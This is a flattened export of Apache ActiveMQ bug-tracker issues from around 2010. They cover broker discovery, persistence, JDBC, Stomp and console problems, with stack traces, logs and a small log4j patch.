texts:Log Stomp protocol errors
Currently we only send an ERROR frame back without logging any error on the broker side.
issueID:AMQ-2842
type:Improvement
changed files:MulticastDiscoveryAgent.java
texts:Multicast discovery failure due to "alive" heartbeats not received on some multihomed systems
Ocassionaly, on some multihomed Windows 2008 systems, brokers cannot be discovered using multicast discovery.  After investigating, it was determined that the broker "alive" heartbeats were not being received by the MulticastDiscoveryAgent.  This was traced back to issues with joining the multicast group using the default network interface.  As Windows socket documentation states,It is recommended that a local IPv4 address or interface index always be specified in the imr_interface member of the ip_mreq  structure, rather than use the default interface. This is particularly important on computers with multiple network interfaces and multiple public IPv4 addresses. (source)AMQ-2381  was submitted with similar issues for multihomed Windows systems.  It was resolved by adding network interface parameters that plumbed through to MulticastSocket.setNetworkInterface(NetworkInterface) and MulticastSocket.setInterface(InetAddress).  However, this set only affects what network interface the multicast traffic is sent on.  Another parameter is also needed to control what network interface multicast traffic is received on, plumbed through to MulticastSocket.join(SocketAddress, NetworkInterface).  (The same networkInterface parameter could be overloaded, but this could be troublesome for backwards compatibility with the current URI specification.)  The attached patch is a proposal to add a new joinNetworkInterface parameter plumbed through to MulticastSocket.join(SocketAddress, NetworkInterface).
issueID:AMQ-2843
type:Sub-task
changed files:Statements.java
texts:Add Message Priority support into JDBC store
None
issueID:AMQ-2845
type:Improvement
changed files:BrokerView.java
texts:log4j conf reload via jmx ignores log4j.configuration setting
If you start your AMQ with log4j.configuration setting (via -D command line, for example), and then reload log4j via mbean with BrokerView.java::reloadLog4jProperties(), the log4j.configuration is ignored, and it went straight to searching for log4j.properties.Here"s diff for the fix:&#8212; BrokerView.java.ORIG        2010-04-26 17:57:20.000000000 -0400+++ BrokerView.java     2010-07-20 09:14:31.000000000 -0400@@ -23,6 +23,7 @@ import java.net.URI; import java.net.URL; import java.util.concurrent.atomic.AtomicInteger;+import java.net.MalformedURLException; import javax.management.ObjectName;@@ -321,8 +322,19 @@             Method resetConfiguration = logManagerClass.getMethod("resetConfiguration", new Class[]{});             resetConfiguration.invoke(null, new Object[]{});  URL log4jprops = cl.getResource("log4j.properties");++           String configurationOptionStr = System.getProperty("log4j.configuration");+           URL log4jprops = null;+           if (configurationOptionStr != null) Unknown macro: {+               try {+                   log4jprops = new URL(configurationOptionStr);+               } catch (MalformedURLException ex) {+                   log4jprops = cl.getResource("log4j.properties");+               }+           }  else {+              log4jprops = cl.getResource("log4j.properties");+           }+             if (log4jprops != null) {                 Class propertyConfiguratorClass = cl.loadClass("org.apache.log4j.PropertyConfigurator");                 Method configure = propertyConfiguratorClass.getMethod("configure", new Class[]{URL.class});
issueID:AMQ-2849
type:Improvement
changed files:
texts:Fanout: unable to apply parameters to discovered brokers
There is currently no way to apply parameters to discovered brokers when using the fanout transport.  The discovery transport allows this by calling DiscoveryTransport.setParameters(Map) in DiscoveryTransportFactory.createTransport(CompositeData).  For example, the following URI would apply a connection timeout of 3 seconds to all discovered TCP transport brokers,    discovery:(multicast://default)?connectionTimeout=3000The corresponding fanout URI would not apply the connection timeout to discovered TCP brokers,    fanout:(multicast://default)?connectionTimeout=3000  This functionality is requested as discovered brokers may become unreachable.  In those circumstances, the default 30 connection timeout for the TCP transport can cause a considerable delay.The attached patch is a proposed solution where both transports that use the discovery transport, failover and fanout, have a common code path in DiscoveryTransportFactory for creating a discovery transport.  This code path sets the parameters consistently for both transports.  (Although it relies on a new static method in DiscoveryTansportFactory and TransportFactory objects do not have static methods, FanoutTransportFactory was already making a static call to DiscoveryAgentFactory).  The patch also has two new test cases, one for apply parameters and another for a minor fix where DiscoveryTransport should cache the added URI after the parameters are applied so that the same URI is removed in onServiceRemove().This issue is created after discussion on the ActiveMQ Users discussion board,    http://old.nabble.com/Applying-Parameters-to-Discovered-Brokers-td29239157.html
issueID:AMQ-2850
type:Test
changed files:KahaTopicReferenceStore.java
texts:AMQ2149Test failure shows issue with topic recovery
regression with this test:Caused by: java.lang.RuntimeException: java.lang.RuntimeException: java.lang.IllegalStateException: Message id ID:minerva.apache.org-56711-1280031958874-3:39:1:1:103 could not be recovered from the data store for: topic://test.dest.9 - already dispatched at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.reset(AbstractStoreCursor.java:113) at org.apache.activemq.broker.region.cursors.StoreDurableSubscriberCursor.reset(StoreDurableSubscriberCursor.java:240) at org.apache.activemq.broker.region.PrefetchSubscription.dispatchPending(PrefetchSubscription.java:572) at org.apache.activemq.broker.region.PrefetchSubscription.add(PrefetchSubscription.java:156) at org.apache.activemq.broker.region.DurableTopicSubscription.add(DurableTopicSubscription.java:204) at org.apache.activemq.broker.region.policy.SimpleDispatchPolicy.dispatch(SimpleDispatchPolicy.java:47) at org.apache.activemq.broker.region.Topic.dispatch(Topic.java:628) at org.apache.activemq.broker.region.Topic.doMessageSend(Topic.java:475) at org.apache.activemq.broker.region.Topic.send(Topic.java:411) at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:365) at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:494) at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129) at org.apache.activemq.broker.scheduler.SchedulerBroker.send(SchedulerBroker.java:136) at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129) at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:95) at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:230) at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:135) at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:457) at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:661) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:306) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:182) at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:217) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:219) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:201)
issueID:AMQ-2852
type:Bug
changed files:
texts:Memory leak when undeploying webapp with ActiveMQ client
I have a web app with an ActiveMQ client. When undeploying the app, Tomcat logs the following messages.28.07.2010 17:44:28 org.apache.catalina.loader.WebappClassLoader clearReferencesThreadsSCHWERWIEGEND: The web application [] appears to have started a thread named [InactivityMonitor Async Task: java.util.concurrent.ThreadPoolExecutor$Worker@c821ef] but has failed to stop it. This is very likely to create a memory leak. 28.07.2010 17:44:28 org.apache.catalina.loader.WebappClassLoader clearReferencesThreadsSCHWERWIEGEND: The web application [] appears to have started a thread named [TcpSocketClose: java.util.concurrent.ThreadPoolExecutor$Worker@19ac2e3] but has failed to stop it. This is very likely to create a memory leak. Searching for "InactivityMonitor Async Task" and "TcpSocketClose", I found org.apache.activemq.transport.tcp.TcpTransport and org.apache.activemq.transport.InactivityMonitor which both start a ThreadPoolExecutor in their static intializers but never stop them. The ThreadPoolExecutors hold references to ActiveMQ classes which hold a reference to the webapp classloader. These references prevent the webapp classes from being unloaded when the webapp is undeployed. Due to this the servlet container runs out of memory after a few redeployments.The ActiveMQ client should dispose all resources when being closed, including the ThreadPoolExecutors. Or to provide some methods to explicitly stop these Threads (like org.apache.activemq.thread.Scheduler.shutdown() does).
issueID:AMQ-2856
type:Bug
changed files:
texts:m2eclipse fails to update maven project configuration
If you try to "Update Project Configuration" via m2eclipse plugin you see the following error:&#91;ERROR&#93; "dependencies.dependency.(groupId:artifactId:type:classifier)" must be unique: org.osgi:org.osgi.core:jar -> duplicate declaration of version  @ org.apache.activemq:apache-activemq:5.4-SNAPSHOT, /home/maurer/workspace2/activemq-trunk/assembly/pom.xmlThis is caused because the dependecy of org.osgi.core is specified two times (with different qualifiers). m2eclipse is really strict on that.
issueID:AMQ-2857
type:Bug
changed files:MySqlJDBCAdapter.java
texts:ActiveMQ fails to create tables in MySQL 5.5.5
Running an embedded ActiveMQ database, using MySQL as the JDBC data source worked fine under MySQL 5.4.  After upgrading to MySQL 5.5.5, ActiveMQ works fine as long as the three required tables in the activemq database already exist (activemq_acks, activemq_lock, activemq_msgs).  However, if they don"t exist, it fails to create the tables, whereas the tables would be automatically created under MySQL 5.4.The problem appears to be in the create table script that"s used.  In previous versions of MySQL, it was legal (though deprecated as of 4.1) to specify the engine using the "TYPE=INNODB" syntax.  The preferred non-deprecated way to do it was to use "ENGINE=INNODB" instead.  Under 5.5.5, it appears that the "TYPE" syntax is now completely illegal, requiring use of the "ENGINE" syntax instead.A relevant MySQL bug discussing the issue: http://bugs.mysql.com/bug.php?id=17501The following is an example of the actual SQL that is generated by ActiveMQ:CREATE TABLE ACTIVEMQ_MSGS(ID BIGINT NOT NULL, CONTAINER VARCHAR(250),MSGID_PROD VARCHAR(250), MSGID_SEQ BIGINT, EXPIRATION BIGINT, MSG LONGBLOB, PRIMARY KEY ( ID ) ) TYPE=INNODBI have not yet tested it, but it seems likely that the culprit is MySqlJDBCAdapter.java.  It includes the line:String typeClause = " TYPE="+type;which should probably change toString typeClause = " ENGINE="+type;
issueID:AMQ-2861
type:Bug
changed files:
texts:Composite destinations doesn&#39;t update CursorMemoryUsage appropriately
None
issueID:AMQ-2863
type:Bug
changed files:BTreeNode.java
texts:KahaDB NPE can occur using random index removes
Stack trace looks like:java.lang.NullPointerException at org.apache.kahadb.index.BTreeNode.getRightLeaf(BTreeNode.java:239) at org.apache.kahadb.index.BTreeNode.remove(BTreeNode.java:314) at org.apache.kahadb.index.BTreeNode.remove(BTreeNode.java:292) at org.apache.kahadb.index.BTreeNode.remove(BTreeNode.java:292) at org.apache.kahadb.index.BTreeNode.remove(BTreeNode.java:292) at org.apache.kahadb.index.BTreeNode.remove(BTreeNode.java:292) at org.apache.kahadb.index.BTreeNode.remove(BTreeNode.java:292) at org.apache.kahadb.index.BTreeNode.remove(BTreeNode.java:292) at org.apache.kahadb.index.BTreeIndex.remove(BTreeIndex.java:194)
issueID:AMQ-2864
type:Bug
changed files:
texts:AMQ2149KahaDBTest - intermittent missing/out of order message with restart/failover and durable subs
intermittent failure, activate of a durable sub and additions to the topic store may need a sync or async store and dispatch topics may need to be disabled.
issueID:AMQ-2866
type:Bug
changed files:SimplePriorityMessageDispatchChannel.java
texts:In SimplePriorityMessageDispatchChannel, message priority isn&#39;t properly constrained between 0 and 9
Per the JMS docs, message priority should be between 0 and 9 inclusive. SimplePriorityMessageDispatchChannel.getPriority attempts to do that, but there"s a bug when constraining the priority to be above 0.
issueID:AMQ-2867
type:Bug
changed files:
texts:a bug when send time out
There is a bug at ActiveMQConnection.java. The response is null when time out,but the code not handled  private Response doSyncSendPacket(Command command, int timeout)   throws JMSException {  try {      Response response = (Response)this.transport.request(command, timeout);      if (response != null && response.isException()) {          ExceptionResponse er = (ExceptionResponse)response;          if (er.getException() instanceof JMSException) {              throw (JMSException)er.getException();          } else {              throw JMSExceptionSupport.create(er.getException());          }      }      return response;  } catch (IOException e) {      throw JMSExceptionSupport.create(e);  } }
issueID:AMQ-2868
type:Bug
changed files:
texts:NegativeQueueTest and JDBC variant - intermittent failure - missing message when cache exhausted
Test fails trying to consume all messages and misses one message on occasion.Problem, concurrent transaction completion leaves messages out of order in the cursor w.r.t to the store. When the cursor is exhausted, the cache memory limit is reached and subsequent messages are not cached so the next message needs to be recovered from the store, the point at which we start reading from the store is important. If, at the point at which the cache is full, the cursor is out of order, it can skip a message in the store.Previously, the entire store was replayed, as if it was never cached and these messages are suppressed by the cursor as duplicates, but there is a size limit and producers spread limit on the duplicate suppression that means messages can avoid duplicate detection. Also, in the case of consumer transactions that rollback, duplicate delivery is required so out of order messages may arrive on a subsequent dispatch.setBatch, ensuring that messages are replayed form the correct point in the store is important to give ordering guarantees with failover and memory limits, so synchronization of the store and cursor w.r.t concurrent transactions is also needed in support of setBatch.Store commit and the after completions that update the cursor need to be serialized for a destination to keep make this totally deterministic.recap, memory limits such that a cache will be filled, concurrent send transaction completion so that store updates and cursor updated can overlap with each other and with cache invalidation. setBatch trying to reduce the replay of messages.Outstanding question: do we make the use of setBatch and transaction sync with store and cursor configurable. If setBatch is off, don"t sync. Then at the mercy of consumer transactions and duplicate suppression in the event of failover. An alternative is to make the sync conditional on the use of the cache for a destination. Very reliable but slow; slow is a very relative determination!Also, may need to be disabled for all destinations as a transaction can span many destinations.
issueID:AMQ-2869
type:Bug
changed files:Main.java
texts:Starting the broker in a path with a space fails
The root of the problem is Jetty issue described herehttp://jira.codehaus.org/browse/JETTY-1063We can workaround the issue, by making sure to escape urls in our classpath
issueID:AMQ-2870
type:Bug
changed files:
texts:Messages that don&#39;t match a message selector for a durable subscription are stored causing the persistent store to eventually fill up
With a durable sub, ack entries are created on a message send for each durable sub, but if the durable sub does not match the message due to a selector, the message remains unacked, pending, such that is can fill up the store. Any unmatched message should be acked immediately.
issueID:AMQ-2872
type:Bug
changed files:
texts:Contention between concurrent connection start and new session creation - start can find partially created session
Exception in thread "Thread-20" java.lang.NullPointerException at org.apache.activemq.ActiveMQSession.start(ActiveMQSession.java:1637) at org.apache.activemq.ActiveMQConnection.start(ActiveMQConnection.java:508) at org.springframework.jms.connection.SingleConnectionFactory$SharedConnectionInvocationHandler.invoke(SingleConnectionFactory.java:514) at $Proxy5.start(Unknown Source) at org.springframework.jms.core.JmsTemplate.execute(JmsTemplate.java:464) at org.springframework.jms.core.JmsTemplate.receiveSelected(JmsTemplate.java:708) at org.springframework.jms.core.JmsTemplate.receive(JmsTemplate.java:686) at com.iona.cpi.failure.http.HttpLoadTest$Receiver.run(HttpLoadTest.java:90) at java.lang.Thread.run(Thread.java:613)Issue is async connection start and session creation. The partially created session is added to the connection too soon.
issueID:AMQ-2874
type:New Feature
changed files:
texts:Add selector support to amq.js
The attached patch adds support for selectors to amq.js and the ajax adapters for jQuery, Prototype, and Dojo.  Unit tests (and a JavaScript testing framework to run them) are included for amq.js.  I"m happy to port the tests to another testing framework if you have one already.  I wasn"t able to find anything like that in the current ActiveMQ sources, and this one seems pretty lightweight.  You can run the tests by pointing your browser to "activemq-web-demo/src/test/javascript/amq_test.html" (as a local filesystem reference, no server required).I tested the ajax adapters both with and without selectors in the following browsers: FF 3.5 on WinXP, IE7 on WinXP, FF 3.5 on OSX, Safari 4 on OSX.  The additions of slectors appears to work as intended.Please especially review the test case "testQueuedMessagesWithoutHeadersAreDeliveredInASinglePost".  In this scenario, 5 messages are queued while a current POST is out to the server.  Messages are send, listen (with selector), send, listen (with selector), send.  The listen messages must go on their own.  If they were batched, the distinct selectors would be merged together and (I assume) applied to both listen commands.  The part I"m not sure about is that the messages are actually delivered in 3 POSTS.  (send, send, send), (listen), (listen).  The 3 outgoing messages all go in 1 POST, then the 2 listens are sent separately.  The thing I"m not sure about is that this means the messages are delivered in an order which differs from the order they were queued in.  I"m not sure if that could pose a problem or not.If that is undesired, it would be quite easy to ensure that messages are delivered in the same order they"re queued in.  In the test case I mentioned above, it would just require that 5 separate POSTs be performed.  Not difficult.I"m of course very interested in other feedback on this patch, or on the tests.  I"ve not submitted code to this project before, so please let me know what I can do to get this patch into an acceptable form.  If you"d like me to attempt integrating these JavaScript tests into Hudson or another CI server, I can take a stab at that as well.
issueID:AMQ-2876
type:Bug
changed files:
texts:Message received from Queue before its expiration and acknowledged after it, is put to deadletter queue in error
message expiry processing in queue subscription when an standard ack is received will process the expired message even though the message has been processed by the consumer. This processing will place the message in the DLQ by default. End result, consumer has the message and DLQ has the message. Because this message was acked before it expired as seen by the consumer but after expiry as seen by the broker, it should not be sent to the DLQ. This holds for expiry checking that is done on receipt of an ACK.If the reply is lost for some time, and the broker expires the inflight message, the ack will be ignored with a warn and normal expiry processing will ensue. In this case, the broker gets to expire the message completely before the consumer gets to reply.
issueID:AMQ-2877
type:Bug
changed files:
texts:Failover and prefetch=0 can result in hung consumers if the MessagePull command is lost
With prefetch=0,  a consumer that has no messages sends an async message to the broker to have it dispatch a single message and waits for the dispatch to ocurr. prefetch=0 makes the consumer a pull consumer, in that it has to ask for a message each time.there is a possibility that failover occurs just after the send of the messagePull command such that the consumer  is blocked waiting for a message but a failover connection or broker does not know about the outstanding pull command. The connection state tracker is the normal mechanism for command replay after failover. This needs to be extended to track messagePull commands, keeping one outstanding reference for each consumer/destination pair that can be replayed after failover.It makes sense to reuse the messageCache for this.
issueID:AMQ-2880
type:Bug
changed files:BrokenPersistenceAdapter.java
texts:Exception thrown during commit leads to message loss
In cases where JDBC persistence is used and the database server is under a fair bit of load it"s sometimes possible for table/row locks to time out, which means you"ll see exceptions such as:java.sql.BatchUpdateException: Lock wait timeout exceeded; try restarting transactionat com.mysql.jdbc.PreparedStatement.executeBatchSerially(PreparedStatement.java:1693)at com.mysql.jdbc.PreparedStatement.executeBatch(PreparedStatement.java:1108)at org.apache.commons.dbcp.DelegatingStatement.executeBatch(DelegatingStatement.java:297)at org.apache.commons.dbcp.DelegatingStatement.executeBatch(DelegatingStatement.java:297)at org.apache.activemq.store.jdbc.TransactionContext.executeBatch(TransactionContext.java:98)at org.apache.activemq.store.jdbc.TransactionContext.executeBatch(TransactionContext.java:80)at org.apache.activemq.store.jdbc.TransactionContext.commit(TransactionContext.java:161)at org.apache.activemq.store.jdbc.JDBCPersistenceAdapter.commitTransaction(JDBCPersistenceAdapter.java:504)at org.apache.activemq.store.memory.MemoryTransactionStore$Tx.commit(MemoryTransactionStore.java:109)at org.apache.activemq.store.memory.MemoryTransactionStore.commit(MemoryTransactionStore.java:220)at org.apache.activemq.transaction.XATransaction.commit(XATransaction.java:73)at org.apache.activemq.broker.TransactionBroker.commitTransaction(TransactionBroker.java:176)at org.apache.activemq.broker.MutableBrokerFilter.commitTransaction(MutableBrokerFilter.java:103)at org.apache.activemq.broker.TransportConnection.processCommitTransactionTwoPhase(TransportConnection.java:430)at org.apache.activemq.command.TransactionInfo.visit(TransactionInfo.java:102)at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:309)at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:185)at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:217)at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:219)at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:201)at java.lang.Thread.run(Thread.java:636)In this case the connection to the database is fine and what we should do is retry the transaction as it"s a temporary failure condition.  Instead what happens is the broker moves to the next message in the queue, leaving the current message in the database.  The message won"t show up in the web console and cannot be consumed by any consumers until the broker is restarted.Attached is a test case that simulates the error condition in a controlled fashion by using a subclassed JDBCPersistenceAdapter that will throw an exception in commitTransaction as necessary.  So the producer sends 10 messages and then the consumer tries to consume them, during this time the persistence adapter will throw an exception during commitTransaction.  Then the condition is cleared and the consumer can consume all 10 messages, however the consumer only consumes 9 messages, the 1st message in the sequence is still in the database.  Hopefully the logging makes this clear.
issueID:AMQ-2881
type:Bug
changed files:
texts:404 status for Broker Instance&#39;s admin console - ACTIVEMQ_HOME and ACTIVEMQ_BASE appear not to be set correctly
In a new AMQ 5.4 installation, I am using a command like "bin/activemq create Broker2" to create a new instance.  There are problems bringing up the admin and other consoles for the new instance due to what seem to be problems in the scripts related to $ACTIVEMQ_HOME and $ACTIVEMQ_BASE.I"ve been able to get this working by changing references to ${activemq.base} to ${activemq.home} for the webapps in the conf/jetty.xml.  It seems to me that the webapps are probably not instance-specific so I believe this makes sense.  I left the directory set to ${activemq.base} for the jetty-realm.properties file thinking these properties are probably instance-specific.I also modified the bin/activemq script to set the ACTIVEMQ_CLASSPATH to "${ACTIVEMQ_BASE}/conf:${ACTIVEMQ_HOME}/conf;${ACTIVEMQ_CLASSPATH}" so that instance-specific config files are picked up before the more generic config files.With these changes in place I am able to create multiple broker instances, set unique openwire and jetty ports in the instance"s conf/activemq.xml and conf/jetty.xml, start the instances, and open their administrative consoles.My modified bin/activemq and conf/jetty.xml files are attached along with the differences to the 5.4 version.
issueID:AMQ-2882
type:Bug
changed files:CreateCommand.java
texts:jetty-realm.properties (No such file or directory) when starting new broker instance
The following exception is seen after creating and starting a new broker instance.  I believe the conf/jetty-real.properties file should be among the files copied from the $ACTIVEMQ_HOME/conf directory to the instance"s conf directory.  A patch is attached.java.io.FileNotFoundException: /home/phil/untouchedAMQ/apache-activemq-5.4.0/BadBroker/conf/jetty-realm.properties (No such file or directory) at java.io.FileInputStream.open(Native Method) at java.io.FileInputStream.<init>(FileInputStream.java:106) at org.eclipse.jetty.util.resource.FileResource.getInputStream(FileResource.java:274) at org.eclipse.jetty.security.HashLoginService.loadUsers(HashLoginService.java:145) at org.eclipse.jetty.security.MappedLoginService.doStart(MappedLoginService.java:115) at org.eclipse.jetty.security.HashLoginService.doStart(HashLoginService.java:186) at org.eclipse.jetty.util.component.AbstractLifeCycle.start(AbstractLifeCycle.java:55) at org.eclipse.jetty.security.SecurityHandler.doStart(SecurityHandler.java:316) at org.eclipse.jetty.security.ConstraintSecurityHandler.doStart(ConstraintSecurityHandler.java:231) at org.eclipse.jetty.util.component.AbstractLifeCycle.start(AbstractLifeCycle.java:55) at org.eclipse.jetty.server.handler.HandlerCollection.doStart(HandlerCollection.java:165) at org.eclipse.jetty.util.component.AbstractLifeCycle.start(AbstractLifeCycle.java:55) at org.eclipse.jetty.server.handler.HandlerWrapper.doStart(HandlerWrapper.java:92) at org.eclipse.jetty.server.Server.doStart(Server.java:228) at org.eclipse.jetty.util.component.AbstractLifeCycle.start(AbstractLifeCycle.java:55) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at java.lang.reflect.Method.invoke(Method.java:597) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeCustomInitMethod(AbstractAutowireCapableBeanFactory.java:1536) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1477) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1409) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:519) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:456) at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:291) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:288) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:190) at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:574) at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:895) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:425) at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64) at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52) at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:96) at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:52) at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71) at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54) at org.apache.activemq.console.command.StartCommand.startBroker(StartCommand.java:115) at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:74) at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57) at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:137) at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57) at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:83) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at java.lang.reflect.Method.invoke(Method.java:597) at org.apache.activemq.console.Main.runTaskClass(Main.java:251) at org.apache.activemq.console.Main.main(Main.java:107)
issueID:AMQ-2883
type:Bug
changed files:
texts:EOFException if stomp+nio after ActiveMQ has sent the first bytes message
Starting broker with C:Javaapache-activemq-5.4.0inactivemq-admin.bat start xbean:activemq-stomp.xmlThe Stomp client sends a number of binary messages but receives only the first one, the broker log on the console looks like this:Java Runtime: Sun Microsystems Inc. 1.6.0_07 C:Program FilesJavajdk1.6.0_07jre  Heap sizes: current=5056k  free=4360k  max=520256k    JVM args: -Dcom.sun.management.jmxremote -Xmx512M -Dorg.apache.activemq.UseDedicatedTaskRunner=true -Djava.util.logging.config.file=logging.properties -Dactivemq.classpath=C:Javaapache-activemq-5.4.0in../conf; -Dactivemq.home=C:Javaapache-activemq-5.4.0in.. -Dactivemq.base=C:Javaapache-activemq-5.4.0in..ACTIVEMQ_HOME: C:Javaapache-activemq-5.4.0in..ACTIVEMQ_BASE: C:Javaapache-activemq-5.4.0in..Loading message broker from: xbean:activemq-stomp.xml INFO | PListStore:C:Javaapache-activemq-5.4.0in..datalocalhost	mp_storage started INFO | Using Persistence Adapter: KahaDBPersistenceAdapter[C:Javaapache-activemq-5.4.0in..datakahadb] INFO | ActiveMQ 5.4.0 JMS Message Broker (localhost) is starting INFO | For help or more information please see: http://activemq.apache.org/ INFO | Scheduler using directory: activemq-datascheduler INFO | Listening for connections at: stomp://mj-PC:61612?transport.closeAsync=false INFO | Connector stomp Started INFO | Listening for connections at: stomp+nio://mj-PC:61613?transport.closeAsync=false INFO | Connector stomp+nio Started INFO | ActiveMQ JMS Message Broker (localhost, ID:mj-PC-49520-1283080154792-0:0) started INFO | Logging to org.slf4j.impl.JCLLoggerAdapter(org.eclipse.jetty.util.log) via org.eclipse.jetty.util.log.Slf4jLog INFO | jetty-7.0.1.v20091125 INFO | ActiveMQ WebConsole initialized. INFO | Initializing Spring FrameworkServlet "dispatcher" INFO | ActiveMQ Console at http://0.0.0.0:8161/admin INFO | Initializing Spring root WebApplicationContext INFO | Connector vm://localhost Started INFO | Camel Console at http://0.0.0.0:8161/camel INFO | ActiveMQ Web Demos at http://0.0.0.0:8161/demo INFO | RESTful file access application at http://0.0.0.0:8161/fileserver INFO | Started SelectChannelConnector@0.0.0.0:8161 INFO | Transport failed: java.io.EOFExceptionjava.io.EOFException        at org.apache.activemq.transport.stomp.StompNIOTransport.serviceRead(StompNIOTransport.java:106)        at org.apache.activemq.transport.stomp.StompNIOTransport.access$000(StompNIOTransport.java:51)        at org.apache.activemq.transport.stomp.StompNIOTransport$1.onSelect(StompNIOTransport.java:80)        at org.apache.activemq.transport.nio.SelectorSelection.onSelect(SelectorSelection.java:94)        at org.apache.activemq.transport.nio.SelectorWorker$1.run(SelectorWorker.java:119)        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:885)        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:907)        at java.lang.Thread.run(Thread.java:619)The Stomp client log is:TCoreIndyTests.TestBytesMessagessend:CONNECTreceived:CONNECTEDsession:ID:mj-PC-49520-1283080154792-5:0send:SUBSCRIBEdestination:/queue/HabariSpeedTestack:autoid:{E4BD9658-B92E-4C57-AD9F-F5357BA66FC2}send:SENDdestination:/queue/HabariSpeedTestcontent-length:4correlation-id:{5B735F2D-349E-4A8A-B2AE-6493A1569F88}☺☻♥1send:SENDdestination:/queue/HabariSpeedTestcontent-length:4correlation-id:{5B735F2D-349E-4A8A-B2AE-6493A1569F88}☺☻♥2send:(more messages, ten total)received:MESSAGEmessage-id:ID:mj-PC-49520-1283080154792-5:0:-1:1:1destination:/queue/HabariSpeedTesttimestamp:1283080192048expires:0subscription:{E4BD9658-B92E-4C57-AD9F-F5357BA66FC2}content-length:4priority:0correlation-id:{5B735F2D-349E-4A8A-B2AE-6493A1569F88}☺☻♥1Received 1 messagesElapsed: 10000 msec (limit: 10000 msec) - giving upsend:DISCONNECTNot sure if this is related but I also see an error in the startup log on later restarts. I reinstalled the broker and the message disappears. INFO | jetty-7.0.1.v20091125 INFO | ActiveMQ WebConsole initialized. INFO | Initializing Spring FrameworkServlet "dispatcher" INFO | ActiveMQ Console at http://0.0.0.0:8161/admin INFO | Initializing Spring root WebApplicationContextERROR | Could not accept connection : java.nio.channels.ClosedSelectorException  <------------------ INFO | Connector vm://localhost Started INFO | Camel Console at http://0.0.0.0:8161/camel INFO | ActiveMQ Web Demos at http://0.0.0.0:8161/demo INFO | RESTful file access application at http://0.0.0.0:8161/fileserver INFO | Started SelectChannelConnector@0.0.0.0:8161
issueID:AMQ-2884
type:Improvement
changed files:
texts:Improve shell script stop function
When JMX is not available or script cannot connect to it, we should not wait for 30 sec, but kill the broker immediately.
issueID:AMQ-2885
type:Improvement
changed files:
texts:Upgrade aries to 0.1-r964701
to be in sync with smx and karaf
issueID:AMQ-2889
type:Bug
changed files:ActiveMQConnectionRequestInfo.java
ActiveMQConnectionSupport.java
